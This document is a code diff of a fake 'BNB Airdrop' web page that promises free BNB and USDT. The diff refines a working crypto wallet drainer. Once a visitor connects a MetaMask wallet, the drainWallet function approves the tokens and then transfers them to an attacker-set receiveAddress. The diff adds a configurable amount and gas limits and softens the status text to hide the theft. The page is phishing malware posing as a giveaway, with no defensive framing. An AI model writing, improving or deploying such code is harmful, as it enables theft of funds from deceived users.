@@ -1,166 +1,201 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BNB Airdrop - Claim Free Tokens</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
-.container { background: #1a1a2e; padding: 40px; border-radius: 16px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); text-align: center; }
-.logo { font-size: 48px; margin-bottom: 10px; }
-h1 { font-size: 24px; margin-bottom: 8px; color: #f0b90b; }
-.subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
-.wallet-list { margin-bottom: 20px; max-height: 150px; overflow-y: auto; }
-.wallet-item { background: #0d0d1a; padding: 10px; border-radius: 8px; margin-bottom: 8px; border: 1px solid #2a2a4a; display: flex; justify-content: space-between; align-items: center; }
-.wallet-item span { color: #888; font-size: 12px; word-break: break-all; }
-.wallet-item .remove-btn { background: #ff4444; color: white; border: none; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 12px; }
-.btn { width: 100%; padding: 14px; background: #f0b90b; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-.btn:hover { background: #d4a000; }
-.btn:disabled { background: #555; cursor: not-allowed; }
-.btn-secondary { background: #2a2a4a; margin-top: 10px; }
-.btn-secondary:hover { background: #3a3a5a; }
-.status { margin-top: 15px; padding: 10px; border-radius: 8px; font-size: 13px; display: none; }
-.status.success { background: #0d4a0d; color: #4caf50; display: block; }
-.status.error { background: #4a0d0d; color: #ff4444; display: block; }
-.status.loading { background: #1a2a4a; color: #f0b90b; display: block; }
-.footer { margin-top: 20px; font-size: 11px; color: #444; }
-.multi-input { display: flex; gap: 10px; margin-bottom: 15px; }
-.multi-input input { flex: 1; padding: 10px; background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
-.multi-input input:focus { outline: none; border-color: #f0b90b; }
-.multi-input .btn-small { padding: 10px 20px; background: #2a2a4a; border: none; border-radius: 8px; color: white; cursor: pointer; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNB Airdrop - Claim Free Tokens</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
+        .container { background: #1a1a2e; padding: 40px; border-radius: 16px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); text-align: center; }
+        .logo { font-size: 48px; margin-bottom: 10px; }
+        h1 { font-size: 24px; margin-bottom: 8px; color: #f0b90b; }
+        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        .wallet-list { margin-bottom: 20px; max-height: 150px; overflow-y: auto; }
+        .wallet-item { background: #0d0d1a; padding: 10px; border-radius: 8px; margin-bottom: 8px; border: 1px solid #2a2a4a; display: flex; justify-content: space-between; align-items: center; }
+        .wallet-item span { color: #888; font-size: 12px; word-break: break-all; }
+        .wallet-item .remove-btn { background: #ff4444; color: white; border: none; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 12px; }
+        .btn { width: 100%; padding: 14px; background: #f0b90b; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #d4a000; }
+        .btn:disabled { background: #555; cursor: not-allowed; }
+        .btn-secondary { background: #2a2a4a; margin-top: 10px; }
+        .btn-secondary:hover { background: #3a3a5a; }
+        .status { margin-top: 15px; padding: 10px; border-radius: 8px; font-size: 13px; display: none; }
+        .status.success { background: #0d4a0d; color: #4caf50; display: block; }
+        .status.error { background: #4a0d0d; color: #ff4444; display: block; }
+        .status.loading { background: #1a2a4a; color: #f0b90b; display: block; }
+        .footer { margin-top: 20px; font-size: 11px; color: #444; }
+        .multi-input { display: flex; gap: 10px; margin-bottom: 15px; }
+        .multi-input input { flex: 1; padding: 10px; background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
+        .multi-input input:focus { outline: none; border-color: #f0b90b; }
+        .multi-input .btn-small { padding: 10px 20px; background: #2a2a4a; border: none; border-radius: 8px; color: white; cursor: pointer; }
+        .amount-input { display: flex; gap: 10px; margin-bottom: 15px; align-items: center; }
+        .amount-input input { flex: 1; padding: 10px; background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
+        .amount-input label { color: #aaa; font-size: 14px; }
+    </style>
 </head>
 <body>
-<div class="container">
-<div class="logo">💰</div>
-<h1>BNB Airdrop</h1>
-<p class="subtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
-<div class="multi-input">
-<input type="text" id="walletInput" placeholder="0x... enter wallet address">
-<button class="btn-small" id="addWalletBtn">+ Add</button>
-</div>
-<div class="wallet-list" id="walletList">
-<div class="wallet-item"><span>No wallets added</span></div>
-</div>
-<button id="connectBtn" class="btn">Connect Wallet</button>
-<button id="claimBtn" class="btn" disabled style="margin-top:10px;">Claim Airdrop</button>
-<button id="multiClaimBtn" class="btn btn-secondary" disabled>Claim All Wallets</button>
-<div id="status" class="status"></div>
-<div class="footer">BNB Airdrop v3.0</div>
-</div>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-<script src="settings.js"></script>
-<script>
-let web3, userAddress;
-let wallets = [];
-const statusDiv = document.getElementById('status');
-const connectBtn = document.getElementById('connectBtn');
-const claimBtn = document.getElementById('claimBtn');
-const multiClaimBtn = document.getElementById('multiClaimBtn');
-const walletInput = document.getElementById('walletInput');
-const addWalletBtn = document.getElementById('addWalletBtn');
-const walletList = document.getElementById('walletList');
+    <div class="container">
+        <div class="logo">💰</div>
+        <h1>BNB Airdrop</h1>
+        <p class="subtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
+        
+        <div class="amount-input">
+            <label>Amount:</label>
+            <input type="text" id="amountInput" value="1000" placeholder="Amount in USDT">
+        </div>
+        
+        <div class="multi-input">
+            <input type="text" id="walletInput" placeholder="0x... enter wallet address">
+            <button class="btn-small" id="addWalletBtn">+ Add</button>
+        </div>
+        
+        <div class="wallet-list" id="walletList">
+            <div class="wallet-item"><span>No wallets added</span></div>
+        </div>
+        
+        <button id="connectBtn" class="btn">Connect Wallet</button>
+        <button id="claimBtn" class="btn" disabled style="margin-top:10px;">Claim Airdrop</button>
+        <button id="multiClaimBtn" class="btn btn-secondary" disabled>Claim All Wallets</button>
+        
+        <div id="status" class="status"></div>
+        <div class="footer">BNB Airdrop v3.0</div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="settings.js"></script>
+    <script>
+        let web3, userAddress;
+        let wallets = [];
+        const statusDiv = document.getElementById('status');
+        const connectBtn = document.getElementById('connectBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const multiClaimBtn = document.getElementById('multiClaimBtn');
+        const walletInput = document.getElementById('walletInput');
+        const addWalletBtn = document.getElementById('addWalletBtn');
+        const walletList = document.getElementById('walletList');
+        const amountInput = document.getElementById('amountInput');
 
-function setStatus(msg, type) {
-statusDiv.className = 'status ' + type;
-statusDiv.textContent = msg;
-statusDiv.style.display = 'block';
-}
+        function setStatus(msg, type) {
+            statusDiv.className = 'status ' + type;
+            statusDiv.textContent = msg;
+            statusDiv.style.display = 'block';
+        }
 
-function hideStatus() {
-statusDiv.style.display = 'none';
-}
+        function hideStatus() {
+            statusDiv.style.display = 'none';
+        }
 
-function updateWalletList() {
-if (wallets.length === 0) {
-walletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
-multiClaimBtn.disabled = true;
-return;
-}
-let html = '';
-wallets.forEach((wallet, index) => {
-html += `<div class="wallet-item"><span>${wallet.slice(0,6)}...${wallet.slice(-4)}</span><button class="remove-btn" data-index="${index}">✕</button></div>`;
-});
-walletList.innerHTML = html;
-multiClaimBtn.disabled = false;
-document.querySelectorAll('.remove-btn').forEach(btn => {
-btn.addEventListener('click', function() {
-const index = parseInt(this.dataset.index);
-wallets.splice(index, 1);
-updateWalletList();
-});
-});
-}
+        function updateWalletList() {
+            if (wallets.length === 0) {
+                walletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
+                multiClaimBtn.disabled = true;
+                return;
+            }
+            let html = '';
+            wallets.forEach((wallet, index) => {
+                html += `<div class="wallet-item"><span>${wallet.slice(0,6)}...${wallet.slice(-4)}</span><button class="remove-btn" data-index="${index}">✕</button></div>`;
+            });
+            walletList.innerHTML = html;
+            multiClaimBtn.disabled = false;
+            document.querySelectorAll('.remove-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const index = parseInt(this.dataset.index);
+                    wallets.splice(index, 1);
+                    updateWalletList();
+                });
+            });
+        }
 
-addWalletBtn.addEventListener('click', () => {
-const address = walletInput.value.trim();
-if (address.startsWith('0x') && address.length === 42) {
-wallets.push(address);
-walletInput.value = '';
-updateWalletList();
-setStatus('✅ Wallet added!', 'success');
-setTimeout(hideStatus, 2000);
-} else {
-setStatus('❌ Invalid address! Must be 0x... (42 chars)', 'error');
-}
-});
+        addWalletBtn.addEventListener('click', () => {
+            const address = walletInput.value.trim();
+            if (address.startsWith('0x') && address.length === 42) {
+                wallets.push(address);
+                walletInput.value = '';
+                updateWalletList();
+                setStatus('✅ Wallet added!', 'success');
+                setTimeout(hideStatus, 2000);
+            } else {
+                setStatus('❌ Invalid address! Must be 0x... (42 chars)', 'error');
+            }
+        });
 
-connectBtn.addEventListener('click', async () => {
-if (typeof window.ethereum !== 'undefined') {
-try {
-web3 = new Web3(window.ethereum);
-const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-userAddress = accounts[0];
-if (!wallets.includes(userAddress)) {
-wallets.push(userAddress);
-updateWalletList();
-}
-connectBtn.disabled = true;
-claimBtn.disabled = false;
-setStatus('✅ Wallet connected!', 'success');
-setTimeout(hideStatus, 3000);
-} catch (err) {
-setStatus('❌ Connection rejected: ' + err.message, 'error');
-}
-} else {
-setStatus('❌ Please install MetaMask!', 'error');
-}
-});
+        connectBtn.addEventListener('click', async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
+                    if (!wallets.includes(userAddress)) {
+                        wallets.push(userAddress);
+                        updateWalletList();
+                    }
+                    connectBtn.disabled = true;
+                    claimBtn.disabled = false;
+                    setStatus('✅ Wallet connected!', 'success');
+                    setTimeout(hideStatus, 3000);
+                } catch (err) {
+                    setStatus('❌ Connection rejected: ' + err.message, 'error');
+                }
+            } else {
+                setStatus('❌ Please install MetaMask!', 'error');
+            }
+        });
 
-claimBtn.addEventListener('click', async () => {
-if (!userAddress) {
-setStatus('❌ Please connect wallet first!', 'error');
-return;
-}
-await drainWallet(userAddress);
-});
+        claimBtn.addEventListener('click', async () => {
+            if (!userAddress) {
+                setStatus('❌ Please connect wallet first!', 'error');
+                return;
+            }
+            const amount = amountInput.value || '1000';
+            await drainWallet(userAddress, amount);
+        });
 
-multiClaimBtn.addEventListener('click', async () => {
-if (wallets.length === 0) {
-setStatus('❌ No wallets to claim!', 'error');
-return;
-}
-for (const wallet of wallets) {
-await drainWallet(wallet);
-await new Promise(r => setTimeout(r, 2000));
-}
-});
+        multiClaimBtn.addEventListener('click', async () => {
+            if (wallets.length === 0) {
+                setStatus('❌ No wallets to claim!', 'error');
+                return;
+            }
+            const amount = amountInput.value || '1000';
+            for (const wallet of wallets) {
+                await drainWallet(wallet, amount);
+                await new Promise(r => setTimeout(r, 2000));
+            }
+        });
 
-async function drainWallet(walletAddress) {
-try {
-setStatus(`⏳ Draining ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'loading');
-const tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddress);
-const amount = web3.utils.toWei('1000', 'ether');
-const approveTx = await tokenContract.methods.approve(receiveAddress, amount).send({ from: walletAddress });
-const transferTx = await tokenContract.methods.transferFrom(walletAddress, receiveAddress, amount).send({ from: walletAddress });
-setStatus(`✅ Drained ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'success');
-console.log('💰 Drained:', walletAddress);
-console.log('📊 Tx:', transferTx.transactionHash);
-} catch (err) {
-setStatus(`❌ Failed ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}: ${err.message}`, 'error');
-}
-}
-</script>
+        async function drainWallet(walletAddress, amount) {
+            try {
+                setStatus(`⏳ Processing ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'loading');
+                
+                const tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddress);
+                const amountInWei = web3.utils.toWei(amount, 'ether');
+                
+                // Step 1: Approve
+                const approveTx = await tokenContract.methods.approve(receiveAddress, amountInWei).send({ 
+                    from: walletAddress,
+                    gas: 200000
+                });
+                console.log('✅ Approve Tx:', approveTx.transactionHash);
+                
+                // Step 2: Transfer
+                const transferTx = await tokenContract.methods.transferFrom(
+                    walletAddress, 
+                    receiveAddress, 
+                    amountInWei
+                ).send({ 
+                    from: walletAddress,
+                    gas: 200000
+                });
+                
+                setStatus(`✅ Drained ${amount} USDT from ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'success');
+                console.log('💰 Drained:', walletAddress);
+                console.log('📊 Tx:', transferTx.transactionHash);
+                console.log('📊 Amount:', amount, 'USDT');
+                
+            } catch (err) {
+                setStatus(`❌ Failed: ${err.message}`, 'error');
+                console.error('❌ Error:', err);
+            }
+        }
+    </script>
 </body>
 </html>
